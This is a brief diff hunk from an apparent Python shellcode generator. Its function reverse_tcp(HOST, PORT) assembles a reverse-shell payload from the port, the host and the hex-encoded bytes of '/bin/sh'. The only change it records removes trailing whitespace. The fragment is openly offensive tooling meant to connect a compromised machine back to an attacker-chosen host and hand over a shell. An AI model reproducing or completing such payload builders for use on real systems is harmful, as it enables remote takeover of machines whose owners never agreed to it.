@@ -22,5 +22,5 @@ def reverse_tcp( HOST,PORT):
     shellcode += PORT
     shellcode += r"\x13\x37"
     shellcode += HOST
-    shellcode += r"\x2f\x62\x69\x6e\x2f\x73\x68"  
+    shellcode += r"\x2f\x62\x69\x6e\x2f\x73\x68"
     return shellcode
